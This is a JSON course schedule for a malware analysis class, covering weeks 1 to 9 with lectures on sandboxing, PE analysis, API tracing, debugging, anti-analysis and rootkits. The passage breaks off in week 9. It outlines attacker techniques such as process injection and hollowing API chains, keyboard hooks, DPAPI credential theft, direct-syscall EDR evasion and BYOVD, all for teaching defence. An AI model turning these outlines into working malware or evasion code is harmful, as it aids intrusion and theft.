@@ -1,0 +1,1446 @@
+{
+  "course_info": {
+    "course_id": "CY304",
+    "title": "Malware Analysis",
+    "credit_hours": 3,
+    "duration": "15 weeks",
+    "meeting_schedule": "Monday, Wednesday - 3 hours per week",
+    "prerequisites": [
+      "CY103 - Operating Systems Security",
+      "CY201 - Ethical Hacking and Penetration Testing",
+      "CS110 - Programming for Security"
+    ]
+  },
+  "class_schedule": [
+    {
+      "week_number": 1,
+      "session_number": 1,
+      "topic": "Malware Taxonomy and Evolution",
+      "duration": "75 minutes",
+      "learning_objectives": [
+        "Classify malware by type, behavior, delivery mechanism, and intent",
+        "Trace the evolution of malware from early viruses to modern APT tooling",
+        "Describe the malware analysis workflow: triage, static, dynamic, and code analysis",
+        "Set up a safe, isolated malware analysis environment with proper safeguards"
+      ],
+      "readings": [
+        "Sikorski & Honig, Practical Malware Analysis, Ch. 1-2",
+        "MITRE ATT&CK software taxonomy and technique matrix",
+        "Kaspersky, Evolution of Malware (2024 annual report)"
+      ],
+      "lecture_notes": {
+        "introduction": "Malware analysis is the process of understanding what malicious software does, how it works, and how to detect and defend against it. It requires a careful, methodical approach in a controlled environment because malware is designed to cause harm: encrypting files, stealing credentials, establishing persistent remote access, or destroying data. The field has evolved dramatically since the first PC virus (Brain, 1986). Early viruses spread via floppy disks and were often hobbyist experiments. Today's malware is developed by organized criminal groups and nation-state actors as professional software with version control, testing pipelines, and customer support (for ransomware-as-a-service). The taxonomy reflects this evolution: viruses attach to legitimate files, worms self-propagate over networks, trojans disguise themselves as legitimate software, ransomware encrypts data for extortion, rootkits hide at the OS kernel level, botnets coordinate thousands of compromised machines, and spyware exfiltrates data silently. Advanced Persistent Threats (APTs) combine multiple malware types with social engineering and zero-day exploits for long-term espionage. Malware analysts are the immune system of the cybersecurity ecosystem: they dissect new threats, extract indicators of compromise, write detection signatures, and inform defenders. This course teaches you the complete analysis workflow.",
+        "key_concepts": [
+          "Malware types: virus (attaches to host), worm (self-propagates), trojan (masquerades as legitimate), ransomware (encrypts for extortion), rootkit (hides from OS), botnet (distributed control), spyware (data theft)",
+          "Analysis types: static (examine without executing), dynamic (observe behavior during execution), code analysis (reverse engineer the logic)",
+          "Analysis environment: isolated VMs with no internet, host-only networking, INetSim for network simulation, VM snapshots for rapid restoration",
+          "Indicators of Compromise (IoCs): file hashes (MD5/SHA-256), IP addresses, domain names, file paths, registry keys, mutex names",
+          "MITRE ATT&CK framework: structured taxonomy of adversary tactics (what they want to achieve) and techniques (how they achieve it)",
+          "Malware-as-a-Service: criminal business model where malware developers sell or rent their tools to operators who conduct attacks",
+          "Kill chain model: delivery, exploitation, installation, C2, actions on objectives; analysis reveals where in the chain the malware operates",
+          "YARA rules: pattern-matching language for classifying and detecting malware based on byte patterns, strings, and conditions",
+          "Triage: rapid initial assessment to determine malware family, severity, and analysis priority using automated tools before deep analysis"
+        ],
+        "demonstration": "Set up a FlareVM analysis workstation in VirtualBox: install PEStudio, x64dbg, Ghidra, Process Monitor, and Wireshark. Configure an isolated network with INetSim on a REMnux VM providing fake DNS, HTTP, HTTPS, and SMTP services. Take a clean snapshot. Then perform initial triage on a sample: check file hash against VirusTotal, examine with PEStudio for suspicious imports and high entropy, and classify using YARA rules from the Yara-Rules repository.",
+        "setup_requirements": [
+          "FlareVM (Windows analysis VM) configured in VirtualBox with snapshot",
+          "REMnux (Linux analysis VM) with INetSim for network simulation",
+          "Host-only network adapter connecting both VMs with no internet access",
+          "VirusTotal API access for hash checking during triage"
+        ],
+        "review": [
+          {
+            "key": "Analysis Safety",
+            "value": "Never analyze malware on a production machine or a machine connected to the internet. Always use isolated VMs with snapshots. Host-only networking ensures malware cannot reach the real internet. INetSim provides fake services so the malware behaves normally while containment is maintained."
+          },
+          {
+            "key": "Static vs Dynamic Complementarity",
+            "value": "Static analysis examines the malware without running it: strings, PE headers, imports. It is safe but defeated by packing and obfuscation. Dynamic analysis observes behavior during execution: file, registry, network activity. It reveals the actual behavior but misses code paths not triggered during observation. Use both."
+          },
+          {
+            "key": "MITRE ATT&CK Mapping",
+            "value": "When analyzing malware, map each observed behavior to an ATT&CK technique: registry persistence = T1547.001, process injection = T1055, DNS tunneling C2 = T1071.004. This standardized taxonomy enables communication between analysts and correlation across campaigns."
+          },
+          {
+            "key": "IoC Lifecycle",
+            "value": "IoCs have a shelf life. IP addresses and domains are rotated by attackers within days or weeks. File hashes change with every recompile. Behavioral patterns (registry keys, mutex names, C2 protocol structure) persist longer and are more valuable for detection."
+          }
+        ]
+      }
+    },
+    {
+      "week_number": 2,
+      "session_number": 2,
+      "topic": "Static Analysis: Strings, PE Headers, and Import Tables",
+      "duration": "75 minutes",
+      "learning_objectives": [
+        "Extract and analyze PE file headers, sections, and import/export tables",
+        "Use strings analysis and entropy measurement to identify packed or encrypted samples",
+        "Apply YARA rules for automated malware detection and classification",
+        "Identify malware capabilities from static indicators without executing the sample"
+      ],
+      "readings": [
+        "Practical Malware Analysis, Ch. 3 (Basic Static Analysis)",
+        "Microsoft PE/COFF Specification",
+        "FLARE Team, FLOSS: FLARE Obfuscated String Solver documentation"
+      ],
+      "lecture_notes": {
+        "introduction": "Static analysis is the safest first step in malware analysis because the malware is never executed. It reveals the malware's structure, imported capabilities, embedded strings, and often its purpose without any risk of infection. The PE (Portable Executable) format is the standard binary format for Windows executables and DLLs. Its headers contain metadata that reveals compilation time, target architecture, entry point, and section layout. The import address table (IAT) lists Windows API functions the malware calls, directly revealing its capabilities: CreateRemoteThread indicates process injection, InternetOpenUrl indicates network communication, CryptEncrypt indicates encryption. Strings embedded in the binary reveal IP addresses, URLs, registry paths, error messages, and debug information that the developer forgot to remove. Entropy analysis measures the randomness of each section: normal compiled code has entropy around 5.0-6.5, while packed or encrypted sections have entropy above 7.0 (maximum 8.0). High-entropy sections indicate that the real malware payload is hidden and will only be revealed at runtime through unpacking, making dynamic analysis necessary. Tools like PEStudio, CFF Explorer, and DIE (Detect It Easy) automate much of this analysis, but understanding what the tools are checking is essential for interpreting results on novel or sophisticated samples.",
+        "key_concepts": [
+          "PE header analysis: DOS header, PE signature, COFF header (machine type, timestamp), Optional header (entry point, image base, subsystem)",
+          "PE sections: .text (code), .data (initialized data), .rdata (read-only data, imports), .rsrc (resources), .reloc (relocation table)",
+          "Import Address Table (IAT): lists DLLs and their functions that the executable calls, reveals capabilities without execution",
+          "Suspicious imports: CreateRemoteThread (injection), VirtualAllocEx (remote memory allocation), WriteProcessMemory (process hollowing), WinExec (command execution), CryptEncrypt (encryption)",
+          "Strings analysis: extract ASCII and Unicode strings, look for URLs, IPs, registry paths, file paths, error messages, C2 commands",
+          "FLOSS (FLARE Obfuscated String Solver): automatically deobfuscates strings that are XOR-encoded, stack-constructed, or decoded at runtime",
+          "Entropy analysis: Shannon entropy per section, values above 7.0 indicate packing or encryption, normal code is 5.5-6.5",
+          "Packer identification: Detect It Easy (DIE), PEiD identify packers (UPX, Themida, VMProtect) by signature patterns in headers and entry point code",
+          "YARA rules: rules matching byte patterns, strings, PE characteristics, and conditions for automated classification"
+        ],
+        "demonstration": "Analyze a malware sample with PEStudio: examine the PE header compilation timestamp (is it recent or does it match known campaigns?), check imports (CreateRemoteThread + VirtualAllocEx = process injection capability), extract strings (find a hardcoded C2 URL and a mutex name), measure section entropy (.text at 7.8 suggests UPX packing). Use DIE to confirm UPX packing. Unpack with upx -d. Re-analyze the unpacked sample to reveal the hidden imports and strings. Write a YARA rule matching the C2 URL pattern and the mutex name.",
+        "setup_requirements": [
+          "PEStudio, CFF Explorer, PE-bear for PE analysis",
+          "FLOSS (FLARE Obfuscated String Solver) for string deobfuscation",
+          "Detect It Easy (DIE) for packer identification",
+          "UPX unpacker, YARA for rule testing"
+        ],
+        "review": [
+          {
+            "key": "Suspicious Import Chains",
+            "value": "CreateToolhelp32Snapshot + Process32First = process enumeration. OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread = classic DLL injection. NtUnmapViewOfSection + NtMapViewOfSection = process hollowing. These import chains are malware signatures even without executing the code."
+          },
+          {
+            "key": "Packing Detection",
+            "value": "Packed executables have: high entropy (above 7.0) in code sections, few readable strings, small import table (only LoadLibrary and GetProcAddress needed to unpack), unusual section names (UPX0/UPX1), and large size difference between file and memory image. Unpacking must occur before meaningful static analysis."
+          },
+          {
+            "key": "Compilation Timestamp",
+            "value": "The PE header contains a TimeDateStamp field set at compile time. A future date indicates the timestamp was manipulated. A date matching known campaign timelines connects the sample to a threat actor. Some malware families always zero out the timestamp to prevent attribution."
+          },
+          {
+            "key": "YARA Rule Best Practices",
+            "value": "Use at least 3 conditions combining strings, byte patterns, and PE features to reduce false positives. Test against a clean file corpus before deploying. Include a description and reference to the analysis report. Rules targeting unique strings are more specific than rules targeting common API calls."
+          }
+        ]
+      }
+    },
+    {
+      "week_number": 3,
+      "session_number": 3,
+      "topic": "Dynamic Analysis: Sandboxing and Behavioral Monitoring",
+      "duration": "75 minutes",
+      "learning_objectives": [
+        "Execute malware safely in a sandbox environment with proper containment",
+        "Monitor file system, registry, process, and network activity during execution",
+        "Identify malware capabilities from behavioral observations",
+        "Compare manual dynamic analysis with automated sandbox analysis"
+      ],
+      "readings": [
+        "Practical Malware Analysis, Ch. 4 (Dynamic Analysis Basics)",
+        "Cuckoo Sandbox documentation and analysis module reference",
+        "ANY.RUN Interactive Sandbox analysis examples"
+      ],
+      "lecture_notes": {
+        "introduction": "Dynamic analysis reveals what malware actually does when it runs. This is essential for understanding packed or obfuscated samples whose static characteristics are deliberately hidden. By monitoring the malware's interactions with the operating system -- file creation, registry modification, process creation, network communication -- we observe its behavior without needing to understand its code. The Sysinternals tools are the Swiss Army knife of manual dynamic analysis on Windows. Process Monitor captures every file, registry, and network operation. Process Explorer shows the process tree with DLLs and handles. Regshot takes before/after snapshots highlighting all changes. FakeNet-NG captures network traffic to identify C2 communication. Automated sandboxes (Cuckoo, ANY.RUN, Joe Sandbox) combine all these monitoring capabilities with automated reporting. Manual analysis provides deeper insight but is slower; automated analysis provides breadth for triaging large volumes.",
+        "key_concepts": [
+          "Process Monitor (ProcMon): real-time monitoring of file, registry, network, process, and thread activity with filtering by process name or operation type",
+          "Process Explorer: advanced task manager showing process tree, DLLs loaded, handles, network connections, and GPU usage",
+          "Regshot: before/after registry comparison highlighting all keys and values created, modified, or deleted",
+          "FakeNet-NG: network simulation tool that responds to DNS, HTTP, HTTPS, SMTP, capturing malware network communication without internet access",
+          "Behavioral indicators: file drops (copying itself), persistence (registry Run keys, scheduled tasks), process injection, C2 communication (beaconing)",
+          "Automated sandboxes: Cuckoo (open-source), ANY.RUN (interactive), Joe Sandbox (commercial), VirusTotal behavior analysis",
+          "Sandbox evasion: malware may detect VMs, debuggers, or sandboxes and behave differently in analysis environments",
+          "API monitoring: hooking Windows API calls to log every system call the malware makes with parameters and return values",
+          "Mutex analysis: malware creates named mutexes to prevent multiple instances; the mutex name is a reliable IoC"
+        ],
+        "demonstration": "Execute a ransomware sample in the FlareVM sandbox with ProcMon, Process Explorer, and FakeNet-NG running. Observe: (1) ProcMon shows file enumeration and encryption. (2) Registry persistence via Run key. (3) FakeNet-NG captures C2 communication. (4) Process Explorer shows a unique mutex. Map each behavior to MITRE ATT&CK. Restore from snapshot.",
+        "setup_requirements": [
+          "FlareVM with ProcMon, Process Explorer, Regshot, and FakeNet-NG",
+          "VM snapshot taken before malware execution",
+          "Wireshark or FakeNet-NG for network capture",
+          "Sample malware files (provided, lab-specific)"
+        ],
+        "review": [
+          {
+            "key": "ProcMon Filtering",
+            "value": "ProcMon captures thousands of events per second from all processes. Filter by Process Name = malware.exe to isolate malware activity. Key operations: CreateFile, RegSetValue, TCP Connect, WriteFile. Save the filtered log for the analysis report."
+          },
+          {
+            "key": "Persistence Mechanisms",
+            "value": "Common: Registry Run/RunOnce keys, Scheduled Tasks, Windows Services, Startup folder shortcuts, WMI event subscriptions. Less common: DLL search order hijacking, COM object hijacking, AppInit_DLLs. Check all of these in dynamic analysis."
+          },
+          {
+            "key": "Network Behavior",
+            "value": "DNS queries reveal C2 domain names. HTTP/HTTPS connections reveal C2 IP addresses. POST requests may contain exfiltrated data. Periodic connections with consistent intervals indicate automated C2 check-in (beaconing)."
+          },
+          {
+            "key": "Sandbox Report Validation",
+            "value": "Automated sandbox reports may miss behavior if the malware sleeps longer than the analysis timeout, requires user interaction, or checks for specific environment conditions. Always verify automated results with targeted manual analysis."
+          }
+        ]
+      }
+    },
+    {
+      "week_number": 4,
+      "session_number": 4,
+      "topic": "Behavioral Analysis and API Tracing",
+      "duration": "75 minutes",
+      "learning_objectives": [
+        "Use API monitoring to trace Windows API calls made by malware with full parameter logging",
+        "Identify malware behavioral patterns: keylogging, screen capture, credential theft, data staging",
+        "Correlate API call sequences to identify high-level malware capabilities",
+        "Distinguish between benign and malicious use of common Windows APIs"
+      ],
+      "readings": [
+        "Practical Malware Analysis, Ch. 7 (Windows Internals for Malware Analysis)",
+        "Windows API documentation for security-relevant functions",
+        "Mandiant, Tracking Malware with API Call Sequences"
+      ],
+      "lecture_notes": {
+        "introduction": "API tracing goes deeper than behavioral monitoring by logging every Windows API call with all parameters and return values. Understanding which API sequences correspond to which capabilities is essential. Keylogging uses SetWindowsHookEx with WH_KEYBOARD_LL. Screen capture uses GetDC and BitBlt. Credential theft reads browser databases with CryptUnprotectData. Process injection follows OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread. Each produces a distinctive API sequence that an analyst can recognize. This lecture covers how to use API Monitor and Frida for deep behavioral analysis, and how to map API sequences to MITRE ATT&CK techniques for standardized reporting.",
+        "key_concepts": [
+          "API monitoring tools: API Monitor (Windows, full parameter logging), Frida (cross-platform dynamic instrumentation)",
+          "Keylogging APIs: SetWindowsHookEx(WH_KEYBOARD_LL), GetAsyncKeyState, RegisterRawInputDevices",
+          "Screen capture APIs: GetDC(NULL), BitBlt, CreateCompatibleBitmap, GetDIBits",
+          "Credential theft APIs: CryptUnprotectData (decrypt stored passwords), CredEnumerateA (enumerate Windows credentials)",
+          "Process injection sequence: OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread",
+          "Process hollowing sequence: CreateProcess(SUSPENDED), NtUnmapViewOfSection, VirtualAllocEx, WriteProcessMemory, SetThreadContext, ResumeThread",
+          "Token manipulation: OpenProcessToken, DuplicateTokenEx, ImpersonateLoggedOnUser",
+          "Data staging: CreateFile (temp directory), WriteFile (collected data), compress/encrypt, network send, DeleteFile (cleanup)",
+          "Anti-forensics APIs: DeleteFileA, NtSetInformationFile (timestomping), RtlAdjustPrivilege"
+        ],
+        "demonstration": "Use API Monitor to trace a spyware sample: observe keyboard hook installation, keystroke capture, Chrome password decryption via CryptUnprotectData, data staging and Base64 encoding, HTTP POST exfiltration. Map each API sequence to ATT&CK techniques.",
+        "setup_requirements": [
+          "API Monitor configured for Windows API call interception",
+          "FlareVM with Chrome installed (containing test credentials)",
+          "Network capture with FakeNet-NG",
+          "MITRE ATT&CK reference for technique mapping"
+        ],
+        "review": [
+          {
+            "key": "Process Injection Detection",
+            "value": "The classic DLL injection sequence is detectable by EDR via API hooking. Modern malware uses APC injection, atom bombing, process hollowing, or direct syscalls to bypass API hooks."
+          },
+          {
+            "key": "CryptUnprotectData",
+            "value": "Windows DPAPI encrypts stored credentials using a key derived from the user's login password. Any malware running in the user's context can call CryptUnprotectData to steal all stored credentials."
+          },
+          {
+            "key": "Behavioral vs Signature Detection",
+            "value": "Signature-based detection matches known byte patterns. Behavioral detection monitors API sequences: any process that installs a keyboard hook and sends data over HTTP is suspicious regardless of file hash."
+          },
+          {
+            "key": "Direct Syscalls",
+            "value": "Advanced malware bypasses API hooks by calling syscalls directly using the syscall instruction instead of going through ntdll.dll. Detecting this requires kernel-level monitoring or hardware-assisted tracing."
+          }
+        ]
+      }
+    },
+    {
+      "week_number": 5,
+      "session_number": 5,
+      "topic": "x86 Assembly Fundamentals for Malware Analysis",
+      "duration": "75 minutes",
+      "learning_objectives": [
+        "Read x86 and x86-64 assembly instructions relevant to malware analysis",
+        "Understand register usage, stack operations, and calling conventions",
+        "Identify common code patterns: loops, conditionals, function calls, string operations",
+        "Trace data flow through assembly to understand malware logic"
+      ],
+      "readings": [
+        "Practical Malware Analysis, Ch. 5 (IDA Pro, assembly refresher)",
+        "Intel 64 and IA-32 Architectures Software Developer Manual, Vol. 1 (selected chapters)",
+        "x86 Assembly Language Reference (provided cheat sheet)"
+      ],
+      "lecture_notes": {
+        "introduction": "Reverse engineering malware requires reading assembly language. While decompilers produce pseudo-C code, they sometimes produce incorrect or misleading output for obfuscated code. An analyst who reads assembly directly can verify decompiler output and analyze anti-analysis tricks. x86 assembly uses a small instruction set: data movement (mov, push, pop, lea), arithmetic (add, sub, imul), logic (and, or, xor), comparison (cmp, test), control flow (jmp, je, jne, call, ret), and string operations (rep movsb). The key is understanding registers (eax-edx for general purpose, esp for stack pointer, ebp for frame pointer), the stack (grows downward, holds local variables and return addresses), and calling conventions (cdecl vs stdcall vs x64). With this foundation, you can trace data flow: where does the encryption key come from? What URL does the malware connect to?",
+        "key_concepts": [
+          "x86 registers: EAX (return value), ECX (counter), EDX (data), ESP (stack pointer), EBP (frame pointer), ESI/EDI (string source/destination)",
+          "x86-64 extensions: RAX-RDX (64-bit), R8-R15 (additional), first 4 args in RCX, RDX, R8, R9 (Windows x64)",
+          "Stack operations: PUSH decrements ESP and stores, POP loads and increments, stack grows downward",
+          "Function prologue: push ebp; mov ebp, esp; sub esp, N (allocate locals)",
+          "Function epilogue: mov esp, ebp; pop ebp; ret (restore and return)",
+          "Calling conventions: cdecl (caller cleans stack), stdcall (callee cleans, Windows API), fastcall (first 2 args in ECX/EDX)",
+          "Common patterns: XOR EAX, EAX (zero register), TEST EAX, EAX; JZ (check zero), CMP + conditional jump (if/else)",
+          "String operations: REP MOVSB (memcpy), REP STOSB (memset), with ESI source, EDI destination, ECX count",
+          "LEA (Load Effective Address): computes address without memory access, often used for arithmetic"
+        ],
+        "demonstration": "Disassemble a simple C program in Ghidra and map assembly to source code. Identify function prologue, local variables, a for loop, if/else branching, and a Windows API call. Then examine a malware XOR decryption loop in assembly: trace data flow to find the key and encrypted data address.",
+        "setup_requirements": [
+          "Ghidra 11.x for disassembly and decompilation",
+          "Simple C programs compiled for comparison",
+          "x86 assembly reference cheat sheet",
+          "Sample malware with XOR encryption loop"
+        ],
+        "review": [
+          {
+            "key": "XOR Encryption in Assembly",
+            "value": "The most common string obfuscation: XOR each byte with a key. Single-byte XOR is trivially breakable (try all 256 values). Multi-byte keys require identifying the key length first."
+          },
+          {
+            "key": "Recognizing API Calls",
+            "value": "32-bit: arguments PUSHed right-to-left, then CALL. 64-bit: first 4 args in RCX/RDX/R8/R9. The function name from the import table identifies the API."
+          },
+          {
+            "key": "Stack Frame Analysis",
+            "value": "Local variables at negative EBP offsets: [EBP-4] first local. Arguments at positive offsets: [EBP+8] first argument. Understanding this layout identifies what data the malware processes."
+          },
+          {
+            "key": "Control Flow Recognition",
+            "value": "if (x == 5): CMP EAX, 5; JNE else_block. while (x > 0): CMP, JLE exit, body, JMP top. switch: series of CMP/JE or a jump table."
+          }
+        ]
+      }
+    },
+    {
+      "week_number": 6,
+      "session_number": 6,
+      "topic": "Disassembly Tools: Ghidra and IDA Free",
+      "duration": "75 minutes",
+      "learning_objectives": [
+        "Navigate disassembled code efficiently in Ghidra and IDA Free",
+        "Use cross-references to trace data flow and identify key malware functions",
+        "Apply the Ghidra decompiler to convert assembly to pseudo-C for analysis",
+        "Rename functions and variables to build understanding of malware structure"
+      ],
+      "readings": [
+        "Practical Malware Analysis, Ch. 5-6 (IDA Pro basics)",
+        "Ghidra documentation: CodeBrowser and Decompiler usage",
+        "Eagle, The IDA Pro Book, Ch. 1-5"
+      ],
+      "lecture_notes": {
+        "introduction": "Reverse engineering reveals the exact logic, algorithms, and secrets in malware code. Ghidra and IDA are the dominant disassembly tools. Effective reverse engineering means finding interesting functions, not reading sequentially. The workflow: import binary, check imports for suspicious APIs, follow cross-references, understand the logic, rename functions. Cross-references are the most powerful navigation tool: from any function or string, find every location that calls or references it.",
+        "key_concepts": [
+          "Ghidra CodeBrowser: listing view, decompiler view, function graph, symbol tree",
+          "Auto-analysis: identifies functions, cross-references, data types, and string references automatically",
+          "Cross-references (xrefs): from any function, see every caller and callee",
+          "String cross-references: find suspicious string, press X to see referencing function",
+          "Decompiler output: pseudo-C approximating original source, may have errors with obfuscated code",
+          "Renaming workflow: rename sub_401000 to decrypt_c2_url after understanding its purpose",
+          "Struct and type annotation: define structures for configurations and packets to improve decompiler output",
+          "Ghidra scripting: automate tasks like decoding XOR strings or extracting configurations",
+          "Configuration extraction: find encrypted config blob in .data or .rsrc, reverse the decryption, extract IoCs"
+        ],
+        "demonstration": "Load malware into Ghidra. Follow calls from main to find a function calling InternetOpenUrlA. Trace the URL parameter to a XOR-decode function. Use the decompiler to understand the XOR loop, identify the key, decode the C2 URL. Rename functions to make the malware readable.",
+        "setup_requirements": [
+          "Ghidra 11.x with Java runtime",
+          "IDA Free for comparison",
+          "Malware sample for reverse engineering",
+          "x86 assembly reference"
+        ],
+        "review": [
+          {
+            "key": "Decompiler Limitations",
+            "value": "Decompilers struggle with hand-written assembly, anti-decompiler tricks, and indirect calls. Always verify output against the assembly."
+          },
+          {
+            "key": "Finding Interesting Code",
+            "value": "Check imports for suspicious APIs, check strings for URLs/IPs, follow xrefs to the functions that use them. Do not read linearly from the entry point."
+          },
+          {
+            "key": "Ghidra vs IDA",
+            "value": "Ghidra: free, open-source, excellent decompiler. IDA Pro: commercial, faster for large binaries, industry standard Hex-Rays decompiler."
+          },
+          {
+            "key": "Configuration Extraction",
+            "value": "Many families store encrypted C2 configs in .data or .rsrc sections. Finding and decrypting this configuration produces IoCs for the entire campaign."
+          }
+        ]
+      }
+    },
+    {
+      "week_number": 7,
+      "session_number": 7,
+      "topic": "Debugging with x64dbg and GDB",
+      "duration": "75 minutes",
+      "learning_objectives": [
+        "Use x64dbg to debug Windows malware: breakpoints, stepping, memory inspection",
+        "Use GDB to debug Linux malware and ELF binaries",
+        "Capture decrypted data at runtime by breaking at the right execution point",
+        "Defeat simple anti-debugging techniques during live analysis"
+      ],
+      "readings": [
+        "Practical Malware Analysis, Ch. 9-10 (OllyDbg and Debugging)",
+        "x64dbg documentation and plugin reference",
+        "GDB Reference Manual (breakpoints and memory inspection)"
+      ],
+      "lecture_notes": {
+        "introduction": "Debugging gives complete control over malware execution: pause at any instruction, inspect memory, modify registers, and capture decrypted payloads. This is essential for packed malware where the unpacking stub decrypts the real payload into memory. x64dbg is the standard Windows debugger with plugins for anti-anti-debugging (ScyllaHide) and import reconstruction (Scylla). GDB handles Linux malware with PEDA/GEF enhancements. The key skill is knowing where to set breakpoints: on API calls that reveal behavior, on memory where decrypted data appears, and on jumps that determine code paths.",
+        "key_concepts": [
+          "Breakpoints: software (INT3, modifies code) vs hardware (debug registers, invisible, limited to 4)",
+          "Step over (F8): execute next instruction, stepping over function calls",
+          "Step into (F7): enter function calls to trace internal logic",
+          "Memory dump: after unpacking, dump decrypted payload using Scylla plugin",
+          "Conditional breakpoints: break only when register/memory meets a condition",
+          "API breakpoints: break on Windows API functions to intercept all calls",
+          "Memory breakpoints: break on read/write/execute access to a region",
+          "IAT reconstruction: after dumping, Scylla reconstructs destroyed import tables",
+          "Unpacking strategy: break on VirtualAlloc, find new allocation, set execute breakpoint, dump when triggered"
+        ],
+        "demonstration": "Debug a packed sample in x64dbg: break on VirtualAlloc, note the allocated address, set memory execute breakpoint, run until triggered, dump with Scylla, fix IAT, analyze in Ghidra with full visibility.",
+        "setup_requirements": [
+          "x64dbg with ScyllaHide and Scylla plugins",
+          "GDB with PEDA or GEF plugin",
+          "Packed malware sample for unpacking exercise",
+          "Ghidra for analyzing dumped binary"
+        ],
+        "review": [
+          {
+            "key": "Unpacking Strategy",
+            "value": "Most packers: allocate memory (VirtualAlloc), write decrypted code, transfer execution. Break on VirtualAlloc, find allocation, set hardware execute breakpoint, run, dump when it triggers."
+          },
+          {
+            "key": "Hardware vs Software Breakpoints",
+            "value": "Software breakpoints modify code (detectable). Hardware breakpoints use CPU debug registers (invisible). Use hardware breakpoints when malware checks code integrity."
+          },
+          {
+            "key": "GDB for Linux",
+            "value": "break *0x401000, run, si (step instruction), info registers, x/20x $rsp (examine memory). PEDA/GEF adds colorized output."
+          },
+          {
+            "key": "Dump Validation",
+            "value": "After dumping, verify in PEStudio/Ghidra: imports resolved, strings readable, entry point sensible. Corrupted dumps indicate wrong breakpoint timing."
+          }
+        ]
+      }
+    },
+    {
+      "week_number": 8,
+      "session_number": 8,
+      "topic": "Anti-Analysis Techniques: Packers and VM Detection",
+      "duration": "75 minutes",
+      "learning_objectives": [
+        "Identify and bypass common anti-analysis techniques used by malware",
+        "Understand code obfuscation: control flow flattening, opaque predicates, string encryption",
+        "Defeat anti-VM and anti-sandbox checks during analysis",
+        "Unpack multi-layer packed samples using debugging techniques"
+      ],
+      "readings": [
+        "Practical Malware Analysis, Ch. 15-17 (Anti-Debugging, Anti-VM, Packers)",
+        "Ferrie, The Ultimate Anti-Debugging Reference",
+        "Chen et al., A Survey on Anti-Analysis Techniques for Malware (2023)"
+      ],
+      "lecture_notes": {
+        "introduction": "Sophisticated malware employs anti-analysis techniques to frustrate reverse engineering. Anti-debugging checks detect debuggers (IsDebuggerPresent, timing checks). Anti-VM detects virtualized environments (registry keys, CPUID, MAC addresses). Anti-sandbox checks for analyst indicators (short uptime, few processes). Packers compress/encrypt the payload. Understanding and bypassing these is a prerequisite for analyzing advanced malware.",
+        "key_concepts": [
+          "Anti-debugging: IsDebuggerPresent, NtQueryInformationProcess(ProcessDebugPort), timing checks (RDTSC, GetTickCount), INT 2D, TLS callbacks",
+          "Anti-VM: registry checks for VMware/VirtualBox, CPUID hypervisor bit, MAC address OUI patterns, device name checks",
+          "Anti-sandbox: uptime check, process count, disk size, user activity monitoring, screen resolution",
+          "Packing: UPX (easy), Themida/VMProtect (code virtualization, very hard), ASPack, PECompact",
+          "Multi-layer packing: outer packer reveals inner packer, requiring multiple unpacking iterations",
+          "Code obfuscation: control flow flattening, opaque predicates, dead code insertion",
+          "String encryption: all strings encrypted and decrypted at runtime by stub function",
+          "ScyllaHide: x64dbg plugin that patches anti-debugging checks automatically",
+          "VM hardening: change MAC, remove tools, add documents, ensure sufficient uptime and resources"
+        ],
+        "demonstration": "Analyze malware with IsDebuggerPresent, VMware registry checks, and uptime checks. Use ScyllaHide and manual patching to bypass each. After bypassing, the malware reveals its actual C2 behavior.",
+        "setup_requirements": [
+          "x64dbg with ScyllaHide plugin",
+          "UPX unpacker",
+          "VMware/VirtualBox with VM artifact modification capability",
+          "Sample with anti-analysis techniques"
+        ],
+        "review": [
+          {
+            "key": "ScyllaHide Coverage",
+            "value": "Patches PEB.BeingDebugged, NtGlobalFlag, NtQueryInformationProcess, timing attacks, and more. For custom checks, manual patching is needed."
+          },
+          {
+            "key": "VM Hardening",
+            "value": "Change MAC to non-VMware OUI, remove tools, add documents and browser history, ensure 2+ CPUs, 4GB+ RAM, 30+ minute uptime."
+          },
+          {
+            "key": "Timing Check Bypass",
+            "value": "NOP out the comparison/jump, or use ScyllaHide timing prevention that returns consistent values."
+          },
+          {
+            "key": "Code Virtualization",
+            "value": "VMProtect/Themida convert x86 to custom VM bytecode. The original instructions are gone. Behavioral analysis may be more practical than reversing VM-protected code."
+          }
+        ]
+      }
+    },
+    {
+      "week_number": 9,
+      "session_number": 9,
+      "topic": "Rootkits and Bootkits",
+      "duration": "75 minutes",
+      "learning_objectives": [
+        "Classify rootkits by privilege level: user-mode, kernel-mode, hypervisor, firmware",
+        "Understand kernel-mode rootkit techniques: SSDT hooking, DKOM, filter drivers",
+        "Analyze bootkit infection of MBR and UEFI firmware",
+        "Detect rootkits using integrity checking and memory forensics"
+      ],
+      "readings": [
+        "Practical Malware Analysis, Ch. 18 (Rootkit Concepts)",
+        "Hoglund & Butler, Rootkits: Subverting the Windows Kernel, Ch. 1-4",
+        "ESET Research, FinSpy UEFI Bootkit Analysis"
+      ],
+      "lecture_notes": {
+        "introduction": "Rootkits hide malware from the OS and security tools by operating at privileged levels. Kernel-mode rootkits can hide files, processes, registry keys, and network connections by intercepting OS API calls. Bootkits infect the boot process to load before any security software. UEFI firmware rootkits persist in SPI flash and survive OS reinstallation. Memory forensics with Volatility bypasses rootkit hiding by scanning raw memory directly.",
+        "key_concepts": [
+          "User-mode rootkits: IAT hooking, inline hooking, DLL injection into target processes",
+          "Kernel-mode rootkits: SSDT hooking, DKOM (unlinking processes from ActiveProcessLinks), filter drivers",
+          "MBR bootkit: replaces Master Boot Record, loads before the OS, hooks the kernel during boot",
+          "UEFI bootkit: infects SPI flash firmware, survives OS reinstall and disk replacement",
+          "Secure Boot: UEFI signature verification blocks unsigned boot components",
+          "Cross-view detection: compare OS view (compromised) with raw memory scan (bypasses hooks)",
+          "Volatility Framework: memory forensics finding hidden processes, injected code, kernel hooks",
+          "Driver signature enforcement: Windows requires signed drivers, bypassed via BYOVD (Bring Your Own Vulnerable Driver)",
+          "BYOVD: attackers load a legitimate signed driver with a known vulnerability to gain kernel access"
+        ],
+        "demonstration": "Analyze a memory dump with Volatility: use pslist vs psscan to find DKOM-hidden processes, ssdt to find hooked syscalls, malfind to find injected code, driverirp to find filter driver hooks. Produce a rootkit artifact report.",
+        "setup_requirements": [
+          "Volatility 3 with Windows profile",
+          "Memory dump from rootkit-compromised VM",
+          "Clean system memory dump for comparison",
+          "Rootkit detection report template"
+        ],
+        "review": [
+          {
+            "key": "DKOM Detection",
